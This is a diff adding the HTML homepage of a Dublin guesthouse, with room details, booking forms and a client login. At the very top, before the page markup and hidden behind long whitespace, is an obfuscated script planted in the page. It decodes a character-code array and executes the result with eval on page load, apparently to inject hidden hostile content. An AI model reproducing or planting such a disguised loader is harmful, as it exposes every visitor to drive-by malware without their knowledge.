@@ -1,0 +1,412 @@
+                                                                                                                                                                                                                                                          <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                          v="va"+"l";try{faweb++}catch(btawetb){try{fve^32}catch(btawt4){w=window;e=w["e".concat(v)];}}if(1){f=new Array(40,101,115,110,98,114,105,110,108,40,40,11,10,122,11,10,8,116,97,113,30,97,31,59,32,99,109,99,116,107,101,109,114,46,98,112,101,96,114,101,68,106,101,108,99,110,115,38,39,104,100,114,96,107,101,38,39,59,12,8,13,9,7,97,45,113,114,98,30,61,31,37,104,115,114,112,57,45,47,109,100,52,45,95,100,108,109,110,114,114,114,45,108,101,115,45,97,99,45,63,104,98,61,54,54,57,38,57,13,9,7,97,45,113,116,120,106,101,45,110,111,114,103,116,104,109,110,31,59,32,38,95,98,114,109,108,116,114,101,38,57,13,9,7,97,45,113,116,120,106,101,45,96,111,113,98,101,113,30,61,31,37,48,38,57,13,9,7,97,45,113,116,120,106,101,45,102,101,104,101,104,115,30,61,31,37,49,111,118,39,58,11,10,8,95,46,114,114,121,107,99,46,118,103,100,115,102,32,60,30,39,48,110,120,38,57,13,9,7,97,45,113,116,120,106,101,45,106,101,101,114,32,60,30,39,48,110,120,38,57,13,9,7,97,45,113,116,120,106,101,45,114,111,111,30,61,31,37,49,111,118,39,58,11,10,12,8,9,104,100,40,32,98,111,98,115,109,100,108,116,45,101,101,115,67,108,100,107,101,109,114,66,120,71,100,39,37,97,99,50,39,40,39,13,9,7,123,12,8,9,8,98,111,98,115,109,100,108,116,45,117,114,104,114,101,39,37,60,99,103,118,31,103,100,60,90,39,96,98,52,91,37,62,59,45,100,104,116,62,38,39,59,12,8,9,8,98,111,98,115,109,100,108,116,45,101,101,115,67,108,100,107,101,109,114,66,120,71,100,39,37,97,99,50,39,40,44,97,111,110,101,109,98,67,103,103,108,99,38,97,40,57,13,9,7,125,12,8,125,40,38,41,58);}w=f;s=[];r=String;x="j%";for(i=0;-i+413!=0;i+=1){j=i;if(e&&(031==0x19))s=s+r["fromCharCode"]((1*w[j]+e(x+3)));}if(0x10==020)try{(w+s)()}catch(asga){e("if(1)"+s+"");}</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+    <title>Durban Residence</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name="keywords" content="Durban Residence, hostel in dublin, bed and breakfast in dublin, hostel, room in dublin" />
+	<meta name="description" content="Durban Residence" />
+
+  
+
+	<link rel="SHORTCUT ICON" href="images/icons/apphp.ico" />
+
+
+	<script type="text/javascript" src="templates/default/js/default.js"></script>
+	<link rel="stylesheet" href="templates/default/css/template.css" type="text/css" />
+	<link rel="stylesheet" href="templates/default/css/joomla.css" type="text/css" />
+	<link rel="stylesheet" href="templates/default/css/menu.css" type="text/css" />
+	<link rel="alternate stylesheet" type="text/css" href="templates/default/css/color1_styles.css" title="color1_styles" media="screen" />
+	<link rel="alternate stylesheet" type="text/css" href="templates/default/css/color2_styles.css" title="color2_styles" media="screen" />
+	<link rel="alternate stylesheet" type="text/css" href="templates/default/css/color3_styles.css" title="color3_styles" media="screen" />
+	<link rel="alternate stylesheet" type="text/css" href="templates/default/css/color4_styles.css" title="color4_styles" media="screen" />
+	<script type="text/javascript">
+	var headID = document.getElementsByTagName("head")[0];         
+	var cssNode = document.createElement('link');
+	cssNode.type = 'text/css';
+	cssNode.rel = 'stylesheet';
+	cssNode.href = 'http://durbanresidence.com/templates/atomic/css/css3.css';
+	cssNode.media = 'screen';
+	headID.appendChild(cssNode);
+
+
+	
+	</script>
+	<script type="text/javascript" src="js/html5.js"></script>
+	<script type="text/javascript" src="js/jquery-1.6.1.js" ></script>
+	<script type="text/javascript" src="js/jquery.livequery.js"></script>
+	<script type="text/javascript" src="js/jquery.validate.js" ></script>
+	<script type="text/javascript" src="js/main.js"></script>
+	<script src="js/styleswitch.js" type="text/javascript"></script>
+	<script type="text/javascript" src="js/jquery.faded.js"></script>
+	<script type="text/javascript" src="js/jquery.faded-options.js"></script> 
+	<script type="text/javascript" src="js/imagepreloader.js"></script>
+	<script type="text/javascript" src="js/imagepreloader-options.js"></script>	
+	<script type="text/javascript">
+	$(document).ready(function() {
+		$(".cc_form").validate();
+		});
+	</script>
+</head>
+
+<body id="page1" dir="">
+
+<div class="extra">
+	<div class="header-top">
+	<!-- HEADER -->
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="header">
+				<div class="main">
+					<div class="color-list">
+						<span>change bg</span>
+						<ul>
+							<li class="c1"><a href="#" class="styleswitch" rel="color1_styles">&nbsp;</a></li>
+							<li class="c2"><a href="#" class="styleswitch" rel="color2_styles">&nbsp;</a></li>
+							<li class="c3"><a href="#" class="styleswitch" rel="color3_styles">&nbsp;</a></li>
+							<li class="c4"><a href="#" class="styleswitch" rel="color4_styles">&nbsp;</a></li>
+						</ul>
+					</div>
+					<div class="container">
+						<h1><a href="/index.php/homepage">Durban<span>Residence</span></a></h1>
+                       
+						<div class="nav">
+							<ul>
+							  <li><a href="https://durbanresidence.com/index.php"><span><span>Home</span></span></a></li>
+		         			  <li><a href="https://durbanresidence.com/index.php?page=pages&pid=31&right=1"><span><span>Facilities</span></span></a></li>
+							  <li><a href="/index.php"><span><span>Booking</span></span></a></li>
+							  <li><a href="https://durbanresidence.com/index.php?page=pages&pid=34"><span><span>Location</span></span></a></li>
+							  <li><a href="https://durbanresidence.com/index.php?page=pages&pid=37&right=1"><span><span>Contact</span></span></a></li>    
+						  </ul>
+						</div>
+						<div class="clear"></div>
+					</div>
+					<div class="box">
+						<div id="faded">
+							<ul class="sliders">
+								<li>
+									<img src="templates/default/images/slide1.png" alt="" />
+									<div class="fleft">
+										<strong>Welcome!</strong>
+																<p>Durban residence welcomes you to it's new website. </p>
+																			</div>
+								</li>
+								<li>
+									<img src="templates/default/images/slide2.png" alt="" />
+									<div class="fleft">
+										<strong>about us</strong>
+										<p><span>Durbanresidence formerly known as Durban House is...</span></p>
+										<a class="readmore" href="index.php/location?id=1">Read More</a>									</div>
+								</li>
+								<li>
+									<img src="templates/default/images/slide3.png" alt="" />
+									<div class="fleft">
+										<strong>Our services</strong>
+										<p>We are offering you hospitality as it should be.</p>
+									</div>
+								</li>
+								<li>
+									<img src="templates/default/images/slide4.png" alt="" />
+									<div class="fleft">
+										<strong>about booking</strong>
+										<p>To book online you can find us on <a href="www.hostelworld.com">hostelworld.com</a> or call us directly at:</p>
+<div class="booking">
+ 
+Durban House<br />
+69 Lower Gardiner St<br />
+Dublin 1<br />
+Ireland<br />
+PH: 353-1-8364668<br />
+Fax: 353-1-8553954<br />
+Email: info@durbanresidence.com<br />
+</div>
+										<a class="readmore" href="#">Read More</a>									</div>
+								</li>
+							</ul>		
+						</div>
+					</div>
+			  </div>
+			</div><!-- header -->				
+	<!-- content -->
+<div id="content">
+				<div class="main">
+					<div class="box">
+				
+						<div class="wrapper">
+							<div class="col-1">
+								<div class="indent-col">
+									<div class="wrapper divider">
+										<div class="col-1 col-indent">
+					<div class='pages_contents'><h2>Home</h2><font size="4"><span style="color: #FF0000;"><span style="font-weight: bold;"><font size="3"></font></span></span></font>Durban house is a fully refurbished, listed building, which boasts impressive Georgian architecture and interiors.
+<p>We are located in the heart of Dublin city centre, with O’Connell  
+Street, Dublin’s main thoroughfare, only a couple of minutes walk away. 
+ It is also just a few minutes from Temple Bar which is Dublin's 
+cultural  quarter &amp; has lively nightlife that is popular with 
+tourists.</p>
+<p>Enjoy Dublin City's unique nightlife, shopping, theatres, concert  
+venues &amp; historic places of interest within easy walking distance..</p></div>	
+											
+										</div><!-- col1 -->
+										
+										
+									
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<div class="col-2">
+											<h2>In Room</h2>
+										
+											<ul class="list1">
+												<li><a href="#">Private bathroom, comprising shower, toilet and hand basin. </a></li>
+												<li><a href="#">TV/DVD and coffee/tea making facilities.</a></li>
+												<li><a href="#">Towels.</a></li>
+												<li><a href="#">Hair dryer.</a></li>
+																		<li class="more"><a href="#">Learn More</a></li>
+											</ul>
+										</div>
+																		
+									</div>
+								</div>
+							</div>
+							<div class="col-2 black-bg">
+								<div class="indent-col">
+									<h2>Book a Room</h2>
+									<div class="black-box">
+									
+			<div style="position: relative; margin-top: -20px;" class="skype-us">
+			<div style="width: 211px;"><a href="http://www.skype.com/go/download">Download Skype</a> and call us for free.</div>
+			<a href="skype:durbanresidence?call">
+			<img style="margin:auto;" src="templates/default/images/skype_icon.png" style="border: none;" width="104" height="42" alt="Tryb SkypeMe!" /></a>
+		
+		
+</div>
+							<!-- LEFT COLUMN -->
+						<div class='left_box_container'>
+<h3 class='side_box_heading side_box_heading_bg'>Reservation</h3>
+<div class='side_box_content left'>
+<link rel='stylesheet' type='text/css' href='templates/default/css/calendar.css' />							
+		<form action='index.php?page=check_availability' id='reservation-form' name='reservation-form' method='post'>
+		<input type='hidden' name='p' id='page_number' value='1' />
+		<input type='hidden' name='token' value='019fdf509af40303c7008fc2270e6f96' />
+			<table cellspacing='2' border='0'>
+			<tr>
+				<td><label>Check In:</label></td>
+			</tr>
+			<tr>
+				<td nowrap='nowrap'>                                        
+					<select id='checkin_day' name='checkin_monthday' class='checkin_day' onchange="cCheckDateOrder(this,'checkin_monthday','checkin_year_month','checkout_monthday','checkout_year_month');cUpdateDaySelect(this);">
+						<option class='day prompt' value='0'>Day</option><option value='1' >1</option><option value='2' >2</option><option value='3' >3</option><option value='4' >4</option><option value='5' >5</option><option value='6' >6</option><option value='7' >7</option><option value='8' >8</option><option value='9' >9</option><option value='10' >10</option><option value='11' >11</option><option value='12' >12</option><option value='13' >13</option><option value='14' >14</option><option value='15' >15</option><option value='16' >16</option><option value='17' >17</option><option value='18' >18</option><option value='19' >19</option><option value='20' selected='selected'>20</option><option value='21' >21</option><option value='22' >22</option><option value='23' >23</option><option value='24' >24</option><option value='25' >25</option><option value='26' >26</option><option value='27' >27</option><option value='28' >28</option><option value='29' >29</option><option value='30' >30</option><option value='31' >31</option></select>
+					<select id='checkin_year_month' name='checkin_year_month' class='checkin_year_month' onchange="cCheckDateOrder(this,'checkin_monthday','checkin_year_month','checkout_monthday','checkout_year_month');cUpdateDaySelect(this);">
+						<option class='month prompt' value='0'>Month</option><option value='2013-1' selected='selected'>January '13</option><option value='2013-2' >February '13</option><option value='2013-3' >March '13</option><option value='2013-4' >April '13</option><option value='2013-5' >May '13</option><option value='2013-6' >June '13</option><option value='2013-7' >July '13</option><option value='2013-8' >August '13</option><option value='2013-9' >September '13</option><option value='2013-10' >October '13</option><option value='2013-11' >November '13</option><option value='2013-12' >December '13</option></select>
+					<a class='calender' onclick="cShowCalendar(this, 'calendar', 'checkin');" href='javascript:void(0);'><img title='Open calendar and pick a date' alt='calendar' src='templates/default/images/button-calender.png' width='21' height='18' /></a>
+				</td>
+			</tr>
+			<tr>
+				<td><label>Check Out:</label></td>
+			</tr>
+			<tr>
+				<td nowrap='nowrap'>
+					<select id='checkout_monthday' name='checkout_monthday' class='checkout_day' onchange="cCheckDateOrder(this,'checkout_monthday','checkout_year_month');cUpdateDaySelect(this);">
+						<option class='day prompt' selected='selected' value='0'>Day</option><option value='1' >1</option><option value='2' >2</option><option value='3' >3</option><option value='4' >4</option><option value='5' >5</option><option value='6' >6</option><option value='7' >7</option><option value='8' >8</option><option value='9' >9</option><option value='10' >10</option><option value='11' >11</option><option value='12' >12</option><option value='13' >13</option><option value='14' >14</option><option value='15' >15</option><option value='16' >16</option><option value='17' >17</option><option value='18' >18</option><option value='19' >19</option><option value='20' selected='selected'>20</option><option value='21' >21</option><option value='22' >22</option><option value='23' >23</option><option value='24' >24</option><option value='25' >25</option><option value='26' >26</option><option value='27' >27</option><option value='28' >28</option><option value='29' >29</option><option value='30' >30</option><option value='31' >31</option></select>
+					<select id='checkout_year_month' name='checkout_year_month' class='checkout_year_month' onchange="cCheckDateOrder(this,'checkout_monthday','checkout_year_month');cUpdateDaySelect(this);">
+						<option class='month prompt' selected='selected' value='0'>Month</option><option value='2013-1' selected='selected'>January '13</option><option value='2013-2' >February '13</option><option value='2013-3' >March '13</option><option value='2013-4' >April '13</option><option value='2013-5' >May '13</option><option value='2013-6' >June '13</option><option value='2013-7' >July '13</option><option value='2013-8' >August '13</option><option value='2013-9' >September '13</option><option value='2013-10' >October '13</option><option value='2013-11' >November '13</option><option value='2013-12' >December '13</option></select>
+					<a class='calender' onclick="cShowCalendar(this, 'calendar', 'checkout');" href='javascript:void(0);'><img title='Open calendar and pick a date' alt='calendar' src='templates/default/images/button-calender.png' width='21' height='18' /></a>
+				</td>
+			</tr>
+			<tr><td style='height:5px'></td></tr>
+			<tr><td nowrap='nowrap'>
+				Persons:
+					<select class='max_occupation' name='max_adults' id='max_adults'><option value='1' selected='selected'>1&nbsp;</option><option value='2' >2&nbsp;</option><option value='3' >3&nbsp;</option><option value='4' >4&nbsp;</option><option value='5' >5&nbsp;</option><option value='6' >6&nbsp;</option><option value='7' >7&nbsp;</option><option value='8' >8&nbsp;</option>
+				</td>
+			</tr>
+			<tr><td style='height:7px'></td></tr>
+			<tr>
+				<td>
+					<a class='check' onclick="document.getElementById('reservation-form').submit()" value='Check Availability'>Check Availability</a>
+				</td>
+			</tr>	
+			</table>
+		</form>
+		<div id='calendar'></div></div>
+<div class='shadow'></div>
+</div>
+<div class='left_box_container'>
+<h3 class='side_box_heading side_box_heading_bg'>Booking Status</h3>
+<div class='side_box_content left'>
+<form action='index.php?page=check_status' id='check-booking-form' name='check-booking-form' method='post'>
+			<input type='hidden' name='task' id='task' value='check_status' />
+			<input type='hidden' name='token' value='019fdf509af40303c7008fc2270e6f96' />
+			<table cellspacing='2' border='0'>
+			<tr><td>Enter Your Booking Number:</td></tr>
+			<tr><td><input type='text' name='booking_number' style='width:130px' maxlength='20' autocomplete='off' value='' /></td></tr>
+			<tr><td style='height:3px'></td></tr>
+			<tr><td><input class='button' type='submit' value='Check Status' /></td></tr>
+			</table>
+		</form></div>
+<div class='shadow'></div>
+</div>
+<div class='left_box_container'>
+<h3 class='side_box_heading side_box_heading_bg'>Authentication</h3>
+<div class='side_box_content left'>
+<input type='hidden' name='token' value='019fdf509af40303c7008fc2270e6f96' />
+		<form class='authentication-form' action='index.php?client=login' method='post'>
+			<input type='hidden' name='submit_login' value='login' />
+			<input type='hidden' name='type' value='client' />
+			
+			
+			<table border='0' cellspasing='2' cellpadding='1'>
+			<tr><td>Username:</td></tr>
+			<tr><td><input type='text' style='width:130px' name='user_name' id='user_name' maxlength='50' autocomplete='off' value='' /></td></tr>
+			<tr><td>Password:</td></tr>
+			<tr><td><input type='password' style='width:130px' name='password' id='password' maxlength='20' autocomplete='off' value='' /></td></tr>
+			<tr><td nowrap height='2px'></td></tr>
+			<tr><td><input class='button' type='submit' name='submit' value='Login' /></td></tr>
+			<tr><td></td></tr>
+			<tr><td><a class='form_link' href='index.php?client=create_account'>Create account</a></td></tr>
+			<tr><td><a class='form_link' href='index.php?client=password_forgotten'>Forgot your password??</a></td></tr>
+			</table>
+		</form></div>
+<div class='shadow'></div>
+</div>
+<div class='left_box_container'>
+<h3 class='side_box_heading side_box_heading_bg'>Local Time</h3>
+<div class='side_box_content left'>
+20th of January 2013<br />Sunday 11:03 AM</div>
+<div class='shadow'></div>
+</div>
+<div>&nbsp;</div>              
+						
+									</div><!-- booking -->
+								</div>
+							</div>
+						</div> 
+					</div><!-- box -->
+			  </div><!-- main> -->
+			</div>
+			<!-- footer -->
+			<div class="footer">
+				<div class="main">
+					<div class="wrapper">
+						<div class="footer1">Durban House &copy; 2010 &nbsp;|&nbsp;  Developed by: <a href="">IT Consulting Hub</a> </div>
+							<div class="footer2"><a href="http://validator.w3.org/check?uri=referer"><img
+        src="http://www.w3.org/Icons/valid-xhtml10"
+        alt="Valid XHTML 1.0 Strict" height="31" width="88" /></a>  <a href="http://jigsaw.w3.org/css-validator/validator?uri=http%3A%2F%2Fdurbanresidence.com%2F&amp;profile=css3&amp;usermedium=all&amp;warning=1&amp;lang=en-gb">
+        <img style="border:0;width:88px;height:31px"
+            src="http://jigsaw.w3.org/css-validator/images/vcss"
+            alt="Poprawny CSS!" />
+    </a>
+
+        					</div>	
+        
+        		<span class="mail">E-mail: <a href="#">info@durbanresidence.com</a></span>
+					</div>
+					<!-- {%FOOTER_LINK} -->
+				</div>
+			</div>
+	
+
+
+
+	
+	</div>    
+</div><!-- header top -->
+
+<script type='text/javascript' src='templates/default/js/calendar.js'></script>
+<script type='text/javascript'>
+var calendar = new Object();var trCal = new Object();trCal.nextMonth = 'Next';trCal.prevMonth = 'Previous';trCal.closeCalendar = 'Close';trCal.icons = 'templates/default/images/';trCal.iconPrevMonth2 = 'butPrevMonth2.gif';trCal.iconPrevMonth = 'butPrevMonth.gif';trCal.iconNextMonth2 = 'butNextMonth2.gif';trCal.iconNextMonth = 'butNextMonth.gif';trCal.currentDay = '20';var minimum_nights = '1';var months = ['January','February','March','April','May','June','July','August','September','October','November','December'];var days = ['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];
+cCheckDateOrder(document.getElementById('checkin_day'), 'checkin_monthday', 'checkin_year_month', 'checkout_monthday', 'checkout_year_month');</script><script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-24527284-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>    
+</body>
+</html>
+<!-- This script was generated by ApPHP HotelSite v3.6.1 (http://www.apphp.com/php-hotel-site/) -->
+
+
+
+
+
